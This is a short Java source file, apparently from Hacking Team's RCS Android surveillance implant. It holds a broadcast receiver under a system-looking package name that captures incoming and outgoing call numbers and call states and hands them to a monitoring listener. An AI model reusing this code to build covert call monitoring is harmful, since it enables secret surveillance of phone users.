/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.android.service.Call;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class BroadcastMonitorCall extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall";

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Call call;

		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

			// Outgoing phone call
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 1");
			}
			call = new Call(number, Call.OUTGOING, Call.START);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
			final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

			// Phone is ringing
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 2");
			}
			call = new Call(number, Call.INCOMING, Call.START);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
			// Call disconnected
			call = new Call("", Call.INCOMING, Call.END);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 3");
			}
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
			// Call answered, or issuing new outgoing call
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 4");
			}
			call = new Call("", Call.OUTGOING, Call.START);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): default");
			}
			call = new Call("", Call.OUTGOING, Call.END);
		}

		// Caller/Callee number, incoming?/outgoing, in progress?/disconnected
		ListenerCall.self().dispatch(call);
	}
}
